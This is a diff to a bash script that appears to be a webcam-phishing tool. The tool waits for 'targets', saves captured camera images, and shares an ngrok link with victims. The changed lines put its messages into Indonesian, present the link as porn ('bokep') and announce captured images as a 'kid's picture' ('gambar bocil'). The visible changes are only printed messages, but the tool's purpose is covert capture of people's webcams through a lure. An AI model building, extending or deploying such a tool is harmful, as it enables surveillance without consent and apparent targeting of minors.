@@ -75,7 +75,7 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m tekan Ctrl + C to untuk keluar...\e[0m\n"
 while [ true ]; do
 
 
@@ -89,7 +89,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\e[1;77m (saved in images/)\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] nih gambar bocilnya!\e[0m\e[1;77m (saved in images/)\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -162,7 +162,7 @@ if [[ -z $link ]];then
 printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
 exit 1
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m+\e[1;92m] Share bokep\e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 }
 
@@ -226,7 +226,7 @@ fi
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
-printf " For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
+printf " For Any help search 'Youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA'\n"
 sleep 1
 clear
 start
